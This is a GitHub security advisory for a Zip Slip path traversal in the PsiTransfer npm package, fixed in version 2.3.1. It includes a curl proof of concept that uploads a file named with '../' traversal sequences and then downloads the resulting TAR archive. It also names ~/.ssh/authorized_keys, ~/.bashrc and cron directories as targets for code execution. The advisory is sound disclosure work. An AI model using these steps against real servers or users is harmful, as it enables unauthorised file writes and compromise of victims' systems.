# [H] PsiTransfer has Zip Slip Path Traversal via TAR Archive Download

## Summary
Severity: High
Advisory: GHSA-xphh-5v4r-r3rx
CWE: CWE-22, CWE-23
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2025-12-30
Source: https://github.com/advisories/GHSA-xphh-5v4r-r3rx
Type: github-advisory

## Affected
- npm: `psitransfer` — affected >=0 <2.3.1

## Details
### Summary

A Zip Slip vulnerability in PsiTransfer allows an unauthenticated attacker to upload files with path traversal sequences in the filename (e.g. `../../../.ssh/authorized_keys`). When a victim downloads the bucket as a **.tar.gz** archive and extracts it, malicious files are written outside the intended directory, potentially leading to RCE.

### Details

The vulnerability exists in the archive download functionality in **lib/endpoints.js** where user controlled metadata.name is used directly without sanitization when creating TAR archive entries.

```
lib/endpoints.js:275

const entry = pack.entry({ name: info.metadata.name, size: info.size });
```

```
lib/endpoints.js:372
assert(meta.name, 'tus meta prop missing: name');
```

### PoC

I. Upload file with malicious filename (no authentication required).

```
MALICIOUS_NAME=$(echo -n "../../../tmp/dp.txt" | base64)
SID=$(echo -n "evil" | base64)
RETENTION=$(echo -n "3600" | base64)

curl -X POST http://TARGET:3000/files \
  -H "Tus-Resumable: 1.0.0" \
  -H "Upload-Length: 15" \
  -H "Upload-Metadata: name ${MALICIOUS_NAME},sid ${SID},retention ${RETENTION}"
```

II. Complete upload with PATCH

```
curl -X PATCH "http://TARGET:3000/files/evil++<UUID>" \
  -H "Tus-Resumable: 1.0.0" \
  -H "Upload-Offset: 0" \
  -H "Content-Type: application/offset+octet-stream" \
  -d "MALICIOUS_CONTENT"
```
  
III. Victim downloads and extracts TAR

```
curl "http://TARGET:3000/files/evil++<HASH>.tar.gz" -o files.tar.gz
tar -tzf files.tar.gz
```

### Impact

Arbitrary File Write: Attacker can write files anywhere on victim's filesystem when they extract the archive.
RCE: By targeting ~/.bashrc, ~/.ssh/authorized_keys, cron directories etc...
No Authentication Required: Default configuration has **uploadPass: false**.
Social Engineering Vector: Attacker sends malicious download link to victim.

## References
- https://github.com/psi-4ward/psitransfer/security/advisories/GHSA-xphh-5v4r-r3rx
- https://github.com/psi-4ward/psitransfer/commit/6c71bc0b8afa1ffa7aabd6c5fb28677651fd57b6
- https://github.com/psi-4ward/psitransfer
- https://github.com/psi-4ward/psitransfer/releases/tag/v2.3.1
